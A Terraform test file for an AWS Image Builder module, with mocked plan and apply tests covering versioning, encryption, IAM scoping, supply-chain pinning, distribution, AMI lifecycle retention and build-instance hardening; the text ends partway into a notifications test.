# Layer 1 of three: mocked plan tests.
#
# What these CAN prove is the shape of the graph and the content of anything
# Terraform computes itself - versions, IAM policy documents, the governance
# output, and every validation and precondition.
#
# READ THIS BEFORE TRUSTING A GREEN RUN.
#
# mock_provider cannot report RequiresReplace. A changed component document
# plans here as "will be updated in-place"; against the real provider the same
# change is "must be replaced - data, description, kms_key_id, version force
# replacement". So the module's headline feature, immutable-version handling, is
# invisible to this file by construction.
#
# That is exactly how a defect shipped: component_hash_input omitted description
# and kms_key_id, both ForceNew, so adding a CMK replaced the component WITHOUT
# moving its version and CreateComponent would have failed on a version whose
# content had not changed - unrecoverable on retry. 78 green tests said nothing.
# The hash-coverage tests below are the closest a mocked suite can get: they
# assert that the version MOVES when a ForceNew input changes.
#
# What this file also cannot prove is that an image builds. Two bundled test
# assertions used to fail every single build because test components run on a
# NEW instance booted from the snapshot, where cloud-init has regenerated the
# state they asserted was absent. No plan test can see that.
#
# Structural checks on the component YAML live in tests/lint_components.py.

mock_provider "aws" {
  mock_data "aws_partition" {
    defaults = { partition = "aws" }
  }
  mock_data "aws_region" {
    defaults = { name = "eu-west-1" }
  }
  mock_data "aws_caller_identity" {
    defaults = { account_id = "111122223333" }
  }
  # The parent-image guards read these. Without the mock, the provider invents a
  # random root_device_name and the guard fires on every run.
  mock_data "aws_ami" {
    defaults = {
      architecture     = "x86_64"
      root_device_name = "/dev/xvda"
    }
  }
  mock_resource "aws_imagebuilder_component" {
    defaults = { arn = "arn:aws:imagebuilder:eu-west-1:111122223333:component/mock/1.0.0/1" }
  }
  mock_resource "aws_imagebuilder_image_recipe" {
    defaults = { arn = "arn:aws:imagebuilder:eu-west-1:111122223333:image-recipe/mock/1.0.0" }
  }
  mock_resource "aws_imagebuilder_infrastructure_configuration" {
    defaults = { arn = "arn:aws:imagebuilder:eu-west-1:111122223333:infrastructure-configuration/mock" }
  }
  mock_resource "aws_imagebuilder_distribution_configuration" {
    defaults = { arn = "arn:aws:imagebuilder:eu-west-1:111122223333:distribution-configuration/mock" }
  }
  mock_resource "aws_imagebuilder_workflow" {
    defaults = { arn = "arn:aws:imagebuilder:eu-west-1:111122223333:workflow/build/mock/1.0.0/1" }
  }
  mock_resource "aws_iam_role" {
    defaults = { arn = "arn:aws:iam::111122223333:role/mock" }
  }
}

# The baseline is a fully-configured pipeline, not a minimal one. Every check
# block in the module must pass here, because `terraform test` treats a failing
# check as an error rather than the warning it is at plan time — so a minimal
# baseline would make the suite fail on the module's own advisory checks.
variables {
  name         = "test-image"
  description  = "Test image"
  parent_image = "ami-0123456789abcdef0"

  components = [
    {
      name    = "hardening"
      bundled = "amazon-linux-hardening"
    },
    {
      name    = "docker"
      bundled = "install-docker"
      parameters = {
        DockerUser = "ec2-user"
      }
    },
    {
      name    = "verify"
      bundled = "verify-image"
    },
  ]

  subnet_id          = "subnet-0123456789abcdef0"
  security_group_ids = ["sg-0123456789abcdef0"]

  log_s3_bucket = "my-imagebuilder-logs"
  log_s3_prefix = "test-image"

  enable_image_scanning  = true
  ami_ssm_parameter_name = "/ami/test-image/latest"

  # EXPRESSION_MATCH_ONLY because the baseline pins its parent and every
  # component version is content-derived, so the module's default start
  # condition would produce a schedule that can never fire.
  schedule_expression                = "cron(0 3 1 * ? *)"
  pipeline_execution_start_condition = "EXPRESSION_MATCH_ONLY"
}

# ---------------------------------------------------------------------------
# Graph shape
# ---------------------------------------------------------------------------

run "creates_the_expected_resource_set" {
  command = plan

  assert {
    condition     = length(aws_imagebuilder_component.this) == 3
    error_message = "expected one component resource per bundled/inline entry."
  }

  assert {
    condition     = length(aws_imagebuilder_image_recipe.this) == 1
    error_message = "expected exactly one image recipe."
  }

  assert {
    condition     = length(aws_imagebuilder_image_pipeline.this) == 1
    error_message = "expected a pipeline by default."
  }

  assert {
    condition     = length(aws_imagebuilder_image.this) == 0
    error_message = "build_on_apply defaults to false, so no aws_imagebuilder_image should be planned."
  }

  assert {
    condition     = length(aws_imagebuilder_lifecycle_policy.this) == 1
    error_message = "a lifecycle policy should be created by default; without one snapshots accumulate forever."
  }

  assert {
    condition     = length(aws_iam_role.build) == 1 && length(aws_iam_instance_profile.build) == 1
    error_message = "expected a build role and instance profile."
  }
}

run "create_false_makes_nothing" {
  command = plan

  variables {
    create = false
  }

  assert {
    condition = alltrue([
      length(aws_imagebuilder_component.this) == 0,
      length(aws_imagebuilder_image_recipe.this) == 0,
      length(aws_imagebuilder_image_pipeline.this) == 0,
      length(aws_imagebuilder_infrastructure_configuration.this) == 0,
      length(aws_imagebuilder_distribution_configuration.this) == 0,
      length(aws_imagebuilder_lifecycle_policy.this) == 0,
      length(aws_iam_role.build) == 0,
    ])
    error_message = "create = false must plan to nothing at all."
  }
}

run "module_creates_no_network_resources" {
  command = plan

  # BYO network, like the sibling runner modules. If a future change adds a
  # security group or an endpoint here, this fails and the decision becomes
  # explicit rather than incidental.
  assert {
    condition     = length(output.network_contract.required_interface_endpoints) > 0
    error_message = "the network contract must name the endpoints the build needs, since the module creates none."
  }

  assert {
    condition = length([
      for e in output.network_contract.required_interface_endpoints : e if e == "imagebuilder"
    ]) == 0
    error_message = "the contract must NOT list an imagebuilder endpoint: the build instance talks to SSM, not the Image Builder control plane. Listing it costs ~$8/AZ/month for nothing."
  }
}

# ---------------------------------------------------------------------------
# Content-addressed versioning — the property that makes this module usable
# ---------------------------------------------------------------------------

run "component_versions_are_content_derived" {
  command = plan

  assert {
    condition = alltrue([
      for name, v in output.component_versions : can(regex("^1\\.[0-9]{1,3}\\.[0-9]{1,3}$", v))
    ])
    error_message = "auto_version must produce a major.minor.patch version with the caller's major."
  }

  assert {
    # Different documents must not collide onto one version, or the second
    # component to apply would be rejected by AWS.
    condition     = length(distinct(values(output.component_versions))) == length(output.component_versions)
    error_message = "distinct component documents produced identical versions; the content hash is not discriminating."
  }
}

run "recipe_version_tracks_recipe_inputs" {
  command = plan

  assert {
    condition     = can(regex("^1\\.[0-9]{1,3}\\.[0-9]{1,3}$", output.recipe_version))
    error_message = "recipe version must be major.minor.patch."
  }
}

run "changing_a_component_parameter_changes_the_recipe_version" {
  command = plan

  variables {
    components = [
      { name = "hardening", bundled = "amazon-linux-hardening" },
      # DockerUser differs from the baseline.
      { name = "docker", bundled = "install-docker", parameters = { DockerUser = "builder" } },
      { name = "verify", bundled = "verify-image" },
    ]
  }

  assert {
    # A recipe whose version did not move when a component parameter changed
    # would be rejected by AWS as an immutable-version conflict.
    condition     = output.recipe_version != "1.0.0"
    error_message = "recipe version should be derived from inputs including component parameters."
  }
}

run "explicit_versions_are_used_when_auto_version_is_off" {
  command = plan

  variables {
    auto_version      = false
    component_version = "2.3.4"
    recipe_version    = "5.6.7"
  }

  assert {
    condition = alltrue([
      for name, v in output.component_versions : v == "2.3.4"
    ])
    error_message = "auto_version = false must use component_version verbatim."
  }

  assert {
    condition     = output.recipe_version == "5.6.7"
    error_message = "auto_version = false must use recipe_version verbatim."
  }
}

run "auto_version_off_without_a_component_version_is_rejected" {
  command = plan

  variables {
    auto_version   = false
    recipe_version = "1.0.0"
  }

  expect_failures = [aws_imagebuilder_component.this]
}

run "auto_version_off_without_a_recipe_version_is_rejected" {
  command = plan

  variables {
    auto_version      = false
    component_version = "1.0.0"
  }

  expect_failures = [aws_imagebuilder_image_recipe.this]
}

# ---------------------------------------------------------------------------
# Encryption — the property most easily lost silently
# ---------------------------------------------------------------------------

run "root_volume_is_always_encrypted" {
  command = apply

  # apply, not plan: block_device_mapping is a computed nested set, and its
  # contents are not comparable at plan time.
  assert {
    condition = alltrue([
      for m in aws_imagebuilder_image_recipe.this[0].block_device_mapping :
      alltrue([for e in m.ebs : e.encrypted == "true"])
    ])
    error_message = "every block device mapping must set encrypted = \"true\"."
  }
}

run "additional_volumes_are_also_encrypted" {
  command = apply

  variables {
    additional_block_devices = [
      { device_name = "/dev/xvdb", size_gb = 100 },
    ]
  }

  assert {
    condition     = length(aws_imagebuilder_image_recipe.this[0].block_device_mapping) == 2
    error_message = "expected the root mapping plus one additional device."
  }

  assert {
    condition = alltrue([
      for m in aws_imagebuilder_image_recipe.this[0].block_device_mapping :
      alltrue([for e in m.ebs : e.encrypted == "true"])
    ])
    error_message = "an additional block device was planned without encryption."
  }
}

run "an_extra_device_may_not_shadow_the_root_device" {
  command = plan

  variables {
    # AWS would keep one mapping and silently drop the other, which is how an
    # unencrypted, default-sized root volume looks like a successful build.
    additional_block_devices = [
      { device_name = "/dev/xvda", size_gb = 100 },
    ]
  }

  expect_failures = [aws_imagebuilder_image_recipe.this]
}

run "cmk_is_threaded_to_every_encryptable_resource" {
  command = apply

  variables {
    kms_key_arn = "arn:aws:kms:eu-west-1:111122223333:key/12345678-1234-1234-1234-123456789012"
  }

  assert {
    condition = alltrue([
      for m in aws_imagebuilder_image_recipe.this[0].block_device_mapping :
      alltrue([
        for e in m.ebs :
        e.kms_key_id == "arn:aws:kms:eu-west-1:111122223333:key/12345678-1234-1234-1234-123456789012"
      ])
    ])
    error_message = "kms_key_arn must reach the recipe's block device mappings."
  }

  assert {
    condition     = output.governance.customer_managed_key
    error_message = "the governance output must report a customer-managed key when one is supplied."
  }
}

run "build_role_can_use_the_cmk_for_snapshots" {
  command = plan

  variables {
    kms_key_arn = "arn:aws:kms:eu-west-1:111122223333:key/12345678-1234-1234-1234-123456789012"
  }

  # EBS calls KMS on the instance's behalf when creating the encrypted snapshot.
  # Without GenerateDataKey the build fails at the snapshot step, after every
  # component has already run and been paid for.
  assert {
    condition = length([
      for s in jsondecode(aws_iam_role_policy.build[0].policy).Statement :
      s if s.Sid == "UseCmkForImageSnapshots" && contains(s.Action, "kms:GenerateDataKey*")
    ]) == 1
    error_message = "the build role must be able to GenerateDataKey with the supplied CMK."
  }

  assert {
    condition = alltrue([
      for s in jsondecode(aws_iam_role_policy.build[0].policy).Statement :
      s.Resource == ["arn:aws:kms:eu-west-1:111122223333:key/12345678-1234-1234-1234-123456789012"]
      if s.Sid == "UseCmkForImageSnapshots"
    ])
    error_message = "the KMS grant must be scoped to the supplied key, not to *."
  }
}

# ---------------------------------------------------------------------------
# IAM least privilege
# ---------------------------------------------------------------------------

run "log_write_is_scoped_to_the_configured_prefix" {
  command = plan

  assert {
    condition = alltrue([
      for s in jsondecode(aws_iam_role_policy.build[0].policy).Statement :
      s.Resource == ["arn:aws:s3:::my-imagebuilder-logs/test-image/test-image/*"]
      if s.Sid == "PutBuildLogs"
    ])
    error_message = "build log write access must be scoped to the bucket, prefix AND pipeline name, not the whole bucket."
  }

  assert {
    condition = length([
      for s in jsondecode(aws_iam_role_policy.build[0].policy).Statement :
      s if s.Sid == "PutBuildLogs" && contains(s.Action, "s3:GetObject")
    ]) == 0
    error_message = "the build role should not be able to READ the log bucket; it only needs to write."
  }
}

run "build_role_holds_both_mandatory_managed_policies" {
  command = plan

  assert {
    condition     = aws_iam_role_policy_attachment.build_imagebuilder[0].policy_arn == "arn:aws:iam::aws:policy/EC2InstanceProfileForImageBuilder"
    error_message = "the build role needs EC2InstanceProfileForImageBuilder to fetch component documents."
  }

  assert {
    # Not merely for operator convenience: Image Builder executes every phase
    # through SSM RunCommand, so without this nothing runs at all.
    condition     = aws_iam_role_policy_attachment.build_ssm[0].policy_arn == "arn:aws:iam::aws:policy/AmazonSSMManagedInstanceCore"
    error_message = "the build role needs AmazonSSMManagedInstanceCore or Image Builder cannot drive the instance."
  }
}

run "lifecycle_role_trust_is_confused_deputy_proof" {
  command = plan

  assert {
    condition = alltrue([
      for s in jsondecode(aws_iam_role.lifecycle[0].assume_role_policy).Statement :
      try(s.Condition.StringEquals["aws:SourceAccount"], "") == "111122223333"
    ])
    error_message = "the lifecycle role's trust policy must pin aws:SourceAccount, or any account's Image Builder principal is a valid caller."
  }

  assert {
    condition = alltrue([
      for s in jsondecode(aws_iam_role.lifecycle[0].assume_role_policy).Statement :
      s.Principal.Service == "imagebuilder.amazonaws.com"
    ])
    error_message = "the lifecycle role must be assumable by the Image Builder service principal."
  }
}

run "permissions_boundary_reaches_every_created_role" {
  command = plan

  variables {
    permissions_boundary_arn = "arn:aws:iam::111122223333:policy/platform-boundary"
  }

  assert {
    condition     = aws_iam_role.build[0].permissions_boundary == "arn:aws:iam::111122223333:policy/platform-boundary"
    error_message = "the build role must carry the permissions boundary."
  }

  assert {
    condition     = aws_iam_role.lifecycle[0].permissions_boundary == "arn:aws:iam::111122223333:policy/platform-boundary"
    error_message = "the lifecycle role must carry the permissions boundary."
  }
}

run "a_byo_instance_profile_suppresses_role_creation" {
  command = plan

  variables {
    build_instance_profile_name = "platform-imagebuilder-profile"
  }

  assert {
    condition     = length(aws_iam_role.build) == 0 && length(aws_iam_instance_profile.build) == 0
    error_message = "supplying build_instance_profile_name must not also create a role and profile."
  }

  assert {
    condition     = aws_imagebuilder_infrastructure_configuration.this[0].instance_profile_name == "platform-imagebuilder-profile"
    error_message = "the supplied instance profile must be the one the build uses."
  }
}

# ---------------------------------------------------------------------------
# Supply chain
# ---------------------------------------------------------------------------

run "an_unpinned_ssm_parent_image_is_rejected" {
  command = plan

  variables {
    parent_image = "/aws/service/ami-amazon-linux-latest/al2023-ami-kernel-default-x86_64"
  }

  # Both fire, and `terraform test` treats a failing check as an error rather
  # than the warning it is at plan time, so both must be declared.
  expect_failures = [
    aws_imagebuilder_image_recipe.this,
    check.parent_image_is_reproducible,
  ]
}

run "an_unpinned_wildcard_arn_parent_image_is_rejected" {
  command = plan

  variables {
    parent_image = "arn:aws:imagebuilder:eu-west-1:aws:image/amazon-linux-2023-x86/x.x.x/1"
  }

  expect_failures = [
    aws_imagebuilder_image_recipe.this,
    check.parent_image_is_reproducible,
  ]
}

run "an_unpinned_parent_image_is_allowed_when_acknowledged" {
  command = plan

  variables {
    parent_image                = "/aws/service/ami-amazon-linux-latest/al2023-ami-kernel-default-x86_64"
    allow_unpinned_parent_image = true
  }

  # The precondition now passes, but the advisory check still fires - which is
  # the intended behaviour: acknowledging the risk silences the refusal, not the
  # warning.
  expect_failures = [check.parent_image_is_reproducible]

  assert {
    condition     = output.governance.parent_image_pinned == false
    error_message = "the governance output must admit that the parent image is unpinned."
  }
}

run "a_fully_versioned_imagebuilder_arn_counts_as_pinned" {
  command = plan

  variables {
    parent_image = "arn:aws:imagebuilder:eu-west-1:aws:image/amazon-linux-2023-x86/2024.5.20/1"
  }

  assert {
    condition     = output.governance.parent_image_pinned
    error_message = "a fully-versioned Image Builder ARN is reproducible and should count as pinned."
  }
}

run "invalid_yaml_in_a_component_document_is_rejected" {
  command = plan

  variables {
    # Genuinely unparseable.
    components = [{ name = "broken", document = "this: is: not: awstoe" }]
  }

  expect_failures = [var.components]
}

run "valid_yaml_that_is_not_an_awstoe_document_is_rejected" {
  command = plan

  variables {
    # Parses cleanly, has neither schemaVersion nor phases. The previous fixture
    # for this used "this: is: not: awstoe", which is INVALID YAML - so it
    # tripped the yamldecode rule and the AWSTOE-shape rule had zero coverage.
    components = [{ name = "not-awstoe", document = "hello: world\n" }]
  }

  expect_failures = [var.components]
}

run "a_document_with_schemaversion_but_no_phases_is_rejected" {
  command = plan

  variables {
    components = [{ name = "half", document = "schemaVersion: 1.0\nname: x\n" }]
  }

  expect_failures = [var.components]
}

run "a_component_naming_two_sources_is_rejected" {
  command = plan

  variables {
    components = [
      {
        name     = "ambiguous"
        bundled  = "install-docker"
        document = "schemaVersion: 1.0\nphases: []"
      },
    ]
  }

  expect_failures = [var.components]
}

run "a_component_naming_no_source_is_rejected" {
  command = plan

  variables {
    components = [{ name = "empty" }]
  }

  expect_failures = [var.components]
}

run "an_unknown_bundled_component_is_rejected" {
  command = plan

  variables {
    components = [{ name = "typo", bundled = "install-dokcer" }]
  }

  expect_failures = [var.components]
}

run "referenced_component_arns_pass_through_unchanged" {
  command = plan

  variables {
    components = [
      { name = "os-update", arn = "arn:aws:imagebuilder:eu-west-1:aws:component/update-linux/1.0.2/1" },
      { name = "verify", bundled = "verify-image" },
    ]
  }

  assert {
    condition     = length(aws_imagebuilder_component.this) == 1
    error_message = "a component referenced by arn must not be created."
  }

  assert {
    condition     = output.component_arns["os-update"] == "arn:aws:imagebuilder:eu-west-1:aws:component/update-linux/1.0.2/1"
    error_message = "a referenced component ARN must appear unchanged in the output."
  }
}

# ---------------------------------------------------------------------------
# Distribution
# ---------------------------------------------------------------------------

run "the_build_region_is_always_a_distribution_target" {
  command = plan

  variables {
    distribution_regions = ["eu-west-2"]
  }

  assert {
    condition     = contains(output.governance.distribution_regions, "eu-west-1")
    error_message = "Image Builder requires the distribution configuration to include the build region."
  }

  assert {
    condition     = length(output.governance.distribution_regions) == 2
    error_message = "expected the build region plus one extra."
  }
}

run "duplicating_the_build_region_does_not_duplicate_the_distribution" {
  command = plan

  variables {
    distribution_regions = ["eu-west-1", "eu-west-2"]
  }

  assert {
    condition     = length(output.governance.distribution_regions) == 2
    error_message = "naming the build region explicitly must not produce two distributions for it, which the API rejects."
  }
}

run "cross_account_distribution_without_a_cmk_is_rejected" {
  command = plan

  variables {
    target_account_ids = ["444455556666"]
  }

  # AWS-managed EBS keys cannot be shared cross-account, so the copied AMI would
  # land in the target account unlaunchable.
  expect_failures = [aws_imagebuilder_distribution_configuration.this]
}

run "cross_account_distribution_with_a_cmk_is_accepted" {
  command = plan

  variables {
    target_account_ids = ["444455556666"]
    distribution_kms_key_arns = {
      "eu-west-1" = "arn:aws:kms:eu-west-1:111122223333:key/12345678-1234-1234-1234-123456789012"
    }
  }

  assert {
    condition     = tolist(output.governance.distributed_to_accounts) == tolist(["444455556666"])
    error_message = "the governance output must report cross-account distribution targets."
  }
}

run "require_cmk_rejects_a_region_without_a_key" {
  command = plan

  variables {
    require_cmk          = true
    distribution_regions = ["eu-west-2"]
    distribution_kms_key_arns = {
      "eu-west-1" = "arn:aws:kms:eu-west-1:111122223333:key/12345678-1234-1234-1234-123456789012"
    }
  }

  expect_failures = [aws_imagebuilder_distribution_configuration.this]
}

run "a_key_from_the_wrong_region_is_rejected" {
  command = plan

  variables {
    distribution_kms_key_arns = {
      # A cross-region copy is re-encrypted with a key in the TARGET region, so
      # a eu-west-1 key under a eu-west-2 map entry cannot work.
      "eu-west-2" = "arn:aws:kms:eu-west-1:111122223333:key/12345678-1234-1234-1234-123456789012"
    }
  }

  expect_failures = [var.distribution_kms_key_arns]
}

run "publishing_the_ami_publicly_requires_acknowledgement" {
  command = plan

  variables {
    launch_permission = {
      user_groups = ["all"]
    }
  }

  expect_failures = [aws_imagebuilder_distribution_configuration.this]
}

run "a_public_ami_is_reported_as_public_when_acknowledged" {
  command = plan

  variables {
    allow_public_ami = true
    launch_permission = {
      user_groups = ["all"]
    }
  }

  assert {
    condition     = output.governance.ami_is_public
    error_message = "the governance output must report a public AMI."
  }
}

run "ssm_publication_yields_a_usable_launch_template_reference" {
  command = plan

  assert {
    condition     = output.ami_launch_template_reference == "resolve:ssm:/ami/test-image/latest"
    error_message = "the launch template reference must be the resolve:ssm: form consumers can paste."
  }
}

run "no_ssm_parameter_means_no_launch_template_reference" {
  command = plan

  variables {
    ami_ssm_parameter_name = ""
  }

  assert {
    condition     = output.ami_launch_template_reference == null
    error_message = "without an SSM parameter there is nothing to resolve, so the reference must be null rather than a broken string."
  }
}

# ---------------------------------------------------------------------------
# Pipeline
# ---------------------------------------------------------------------------

run "a_five_field_cron_is_rejected" {
  command = plan

  variables {
    # Valid for EventBridge, rejected by Image Builder. Easy to get wrong by
    # copying a rule.
    schedule_expression = "cron(0 3 1 * ?)"
  }

  expect_failures = [var.schedule_expression]
}

run "a_six_field_cron_is_accepted" {
  command = apply

  assert {
    condition = alltrue([
      for s in aws_imagebuilder_image_pipeline.this[0].schedule :
      s.schedule_expression == "cron(0 3 1 * ? *)"
    ])
    error_message = "the schedule expression must reach the pipeline."
  }
}

run "the_start_condition_reaches_the_pipeline" {
  command = apply

  # This used to assert that the DEFAULT start condition
  # (..._AND_DEPENDENCY_UPDATES_AVAILABLE) reached the pipeline, and called that
  # "avoiding rebuilds when nothing changed". It is worse than that: with a
  # pinned parent and content-derived component versions, nothing can ever
  # change, so the schedule never fires at all. The baseline now sets
  # EXPRESSION_MATCH_ONLY and check "the_schedule_can_actually_fire" rejects the
  # combination that cannot work.
  assert {
    condition = alltrue([
      for s in aws_imagebuilder_image_pipeline.this[0].schedule :
      s.pipeline_execution_start_condition == "EXPRESSION_MATCH_ONLY"
    ])
    error_message = "the configured start condition must reach the pipeline."
  }

  assert {
    condition     = !output.governance.rebuilds_only_on_change
    error_message = "EXPRESSION_MATCH_ONLY rebuilds unconditionally, and governance must say so."
  }

  assert {
    condition     = output.governance.schedule_can_fire
    error_message = "the whole point of the change: this schedule must be able to fire."
  }
}

run "a_schedule_on_a_disabled_pipeline_is_rejected" {
  command = plan

  variables {
    pipeline_status = "DISABLED"
  }

  # Dead configuration that reads as a working control.
  expect_failures = [aws_imagebuilder_image_pipeline.this]
}

run "workflows_require_an_execution_role" {
  command = plan

  variables {
    workflows = [
      {
        name     = "custom-build"
        type     = "BUILD"
        document = "name: custom\nschemaVersion: 1.0\nsteps: []"
      },
    ]
  }

  expect_failures = [aws_imagebuilder_image_pipeline.this]
}

run "workflows_are_created_when_a_role_is_supplied" {
  command = plan

  variables {
    workflows = [
      {
        name     = "custom-build"
        type     = "BUILD"
        document = "name: custom\nschemaVersion: 1.0\nsteps: []"
      },
    ]
    workflow_execution_role_arn = "arn:aws:iam::111122223333:role/imagebuilder-workflow"
  }

  assert {
    condition     = length(aws_imagebuilder_workflow.this) == 1
    error_message = "expected one workflow resource."
  }
}

run "create_pipeline_false_still_yields_a_usable_recipe" {
  command = plan

  variables {
    create_pipeline     = false
    schedule_expression = ""
  }

  assert {
    condition     = length(aws_imagebuilder_image_pipeline.this) == 0
    error_message = "create_pipeline = false must not create a pipeline."
  }

  assert {
    condition     = length(aws_imagebuilder_image_recipe.this) == 1
    error_message = "the recipe must still exist so CI can build from it directly."
  }
}

run "build_on_apply_creates_a_one_shot_image" {
  command = plan

  variables {
    build_on_apply = true
  }

  assert {
    condition     = length(aws_imagebuilder_image.this) == 1
    error_message = "build_on_apply must create an aws_imagebuilder_image."
  }
}

# ---------------------------------------------------------------------------
# Retention
# ---------------------------------------------------------------------------

run "both_deprecation_and_deletion_are_on_by_default" {
  command = apply

  # This used to assert that deletion was OFF by default. A policy that deletes
  # nothing costs nothing and saves nothing, and it satisfied a check whose own
  # error message described the resulting unbounded growth. Deletion is now on
  # at 365 days, behind the recency exemption.
  assert {
    condition     = length(aws_imagebuilder_lifecycle_policy.this[0].policy_detail) == 2
    error_message = "expected both a DEPRECATE and a DELETE policy detail by default."
  }

  assert {
    condition = length(distinct(flatten([
      for d in aws_imagebuilder_lifecycle_policy.this[0].policy_detail :
      [for a in d.action : a.type]
    ]))) == 2
    error_message = "expected exactly one DEPRECATE and one DELETE action."
  }

  assert {
    condition     = output.governance.lifecycle_deletes_amis
    error_message = "the governance output must report that old AMIs are deleted."
  }
}

run "enabling_deletion_adds_a_second_policy_detail" {
  command = apply

  variables {
    lifecycle_delete_after_days = 90
  }

  assert {
    condition     = length(aws_imagebuilder_lifecycle_policy.this[0].policy_detail) == 2
    error_message = "expected deprecation plus deletion."
  }

  assert {
    condition = length([
      for d in aws_imagebuilder_lifecycle_policy.this[0].policy_detail :
      d if length([for a in d.action : a if a.type == "DELETE"]) > 0
    ]) == 1
    error_message = "expected exactly one DELETE policy detail."
  }
}

run "deletion_must_also_remove_snapshots" {
  command = apply

  variables {
    lifecycle_delete_after_days = 90
  }

  # An AMI deregistered without its snapshots leaves behind the storage cost the
  # policy exists to control.
  assert {
    condition = alltrue(flatten([
      for d in aws_imagebuilder_lifecycle_policy.this[0].policy_detail : [
        for a in d.action : [
          for ir in a.include_resources : ir.snapshots
        ] if a.type == "DELETE"
      ]
    ]))
    error_message = "a DELETE action must include snapshots, or the storage cost survives the AMI."
  }
}

run "deleting_before_deprecating_is_rejected" {
  command = plan

  variables {
    lifecycle_deprecate_after_days = 90
    lifecycle_delete_after_days    = 30
  }

  expect_failures = [var.lifecycle_delete_after_days]
}

run "deletion_with_no_exemptions_at_all_is_rejected" {
  command = plan

  variables {
    lifecycle_delete_after_days              = 90
    lifecycle_exclude_recently_launched_days = 0
    lifecycle_exclude_tags                   = {}
  }

  # Age is a poor proxy for "in use". Deleting purely on age is how an AMI that
  # something still launches disappears.
  expect_failures = [aws_imagebuilder_lifecycle_policy.this]
}

run "the_lifecycle_policy_selects_by_tag_not_by_pinned_version" {
  command = apply

  # resource_selection takes an exact semantic_version, which under
  # content-addressed versioning would pin the policy to one version and stop
  # covering everything built after the next component edit.
  assert {
    condition = alltrue([
      for rs in aws_imagebuilder_lifecycle_policy.this[0].resource_selection :
      rs.tag_map["SourceRecipe"] == "test-image"
    ])
    error_message = "the lifecycle policy must select images by SourceRecipe tag."
  }

  assert {
    condition = alltrue([
      for rs in aws_imagebuilder_lifecycle_policy.this[0].resource_selection :
      length(rs.recipe) == 0
    ])
    error_message = "the policy must not pin a recipe version, or it stops covering newer builds."
  }
}

run "the_lifecycle_selector_tag_exists_where_aws_actually_looks" {
  command = apply

  # This test used to assert that a distribution configuration existed and that
  # a boolean variable was true. Its comment named the invariant precisely and
  # its body checked neither half of it - which is how the selector-tag defect
  # survived. The real invariant is: the tag the policy selects on must be on
  # the IMAGE BUILDER resource, because that is the only place AWS looks.
  variables {
    lifecycle_delete_after_days = 400
  }

  assert {
    condition = alltrue([
      for rs in aws_imagebuilder_lifecycle_policy.this[0].resource_selection :
      alltrue([
        for k, v in rs.tag_map :
        aws_imagebuilder_image_recipe.this[0].tags[k] == v
      ])
    ])
    error_message = "every tag the lifecycle policy selects on must be present with the same value on the Image Builder resources. AWS does not evaluate the output AMI's EC2 tags."
  }

  assert {
    condition = alltrue([
      for rs in aws_imagebuilder_lifecycle_policy.this[0].resource_selection :
      alltrue([
        for k, v in rs.tag_map :
        aws_imagebuilder_image_pipeline.this[0].tags[k] == v
      ])
    ])
    error_message = "the pipeline must carry the selector tags too, or images it produces out-of-band are not covered."
  }
}

run "a_byo_lifecycle_role_suppresses_role_creation" {
  command = plan

  variables {
    lifecycle_execution_role_arn = "arn:aws:iam::111122223333:role/platform-imagebuilder-lifecycle"
  }

  assert {
    condition     = length(aws_iam_role.lifecycle) == 0
    error_message = "supplying lifecycle_execution_role_arn must not also create a role."
  }

  assert {
    condition     = aws_imagebuilder_lifecycle_policy.this[0].execution_role == "arn:aws:iam::111122223333:role/platform-imagebuilder-lifecycle"
    error_message = "the supplied lifecycle role must be the one the policy uses."
  }
}

# ---------------------------------------------------------------------------
# Build instance posture
# ---------------------------------------------------------------------------

run "imdsv2_is_required_and_the_hop_limit_is_tight" {
  command = apply

  assert {
    condition = alltrue([
      for o in aws_imagebuilder_infrastructure_configuration.this[0].instance_metadata_options :
      o.http_tokens == "required" && o.http_put_response_hop_limit == 1
    ])
    error_message = "the build instance must default to IMDSv2-only with a hop limit of 1."
  }
}

run "no_key_pair_is_configured_by_default" {
  command = apply

  # A key pair is a standing SSH credential on a machine holding the build role.
  assert {
    condition     = aws_imagebuilder_infrastructure_configuration.this[0].key_pair == null
    error_message = "no key pair should be set by default; Image Builder drives the instance over SSM."
  }

  assert {
    condition     = output.governance.build_instance_has_keypair == false
    error_message = "the governance output must report the absence of a key pair."
  }
}

run "the_build_instance_is_terminated_on_failure_by_default" {
  command = apply

  assert {
    condition     = aws_imagebuilder_infrastructure_configuration.this[0].terminate_instance_on_failure
    error_message = "a failed build must not leave a running instance holding the build role by default."
  }
}

run "the_build_instance_is_tagged_for_cost_and_policy" {
  command = apply

  variables {
    build_resource_tags = { CostCentre = "cc-1234" }
  }

  assert {
    condition     = aws_imagebuilder_infrastructure_configuration.this[0].resource_tags["CostCentre"] == "cc-1234"
    error_message = "build_resource_tags must reach the transient build instance."
  }

  assert {
    condition     = aws_imagebuilder_infrastructure_configuration.this[0].resource_tags["ImageBuilderFor"] == "test-image"
    error_message = "the build instance must be attributable to its pipeline."
  }
}

run "build_logs_are_delivered_to_the_configured_prefix" {
  command = apply

  assert {
    condition = alltrue(flatten([
      for l in aws_imagebuilder_infrastructure_configuration.this[0].logging : [
        for s in l.s3_logs : s.s3_bucket_name == "my-imagebuilder-logs" && s.s3_key_prefix == "test-image"
      ]
    ]))
    error_message = "the S3 log destination must reach the infrastructure configuration."
  }
}

run "the_log_group_is_created_so_retention_applies" {
  command = plan

  # Left to Image Builder, the group is created on first build with no expiry.
  assert {
    condition     = aws_cloudwatch_log_group.this[0].name == "/aws/imagebuilder/test-image"
    error_message = "the log group name must match the one Image Builder writes to, or the retention applies to nothing."
  }

  assert {
    condition     = aws_cloudwatch_log_group.this[0].retention_in_days == 30
    error_message = "expected the default 30-day retention."
  }
}

# ---------------------------------------------------------------------------
# Notifications
# ---------------------------------------------------------------------------

run "no_sns_topic_means_no_event_rule" {
  command = plan

  assert {
    condition     = length(aws_cloudwatch_event_rule.image_state) == 0
    error_message = "without an SNS topic there is nowhere to route events, so no rule should be created."
  }
}

run "an_sns_topic_yields_a_rule_that_matches_failures" {
  command = plan

  variables {
    sns_topic_arn = "arn:aws:sns:eu-west-1:111122223333:image-builds"
  }

  assert {
    condition     = length(aws_cloudwatch_event_rule.image_state) == 1
    error_message = "expected an EventBridge rule when a topic is supplied."
  }

  assert {
    condition = contains(
      jsondecode(aws_cloudwatch_event_rule.image_state[0].event_pattern).detail.state.status,
      "FAILED"
    )
    error_message = "the default event pattern must match FAILED."
  }

  assert {
    condition     = jsondecode(aws_cloudwatch_event_rule.image_state[0].event_pattern).source == ["aws.imagebuilder"]
    error_message = "the event pattern must be scoped to Image Builder events."
  }
}

run "notify_on_states_is_honoured" {
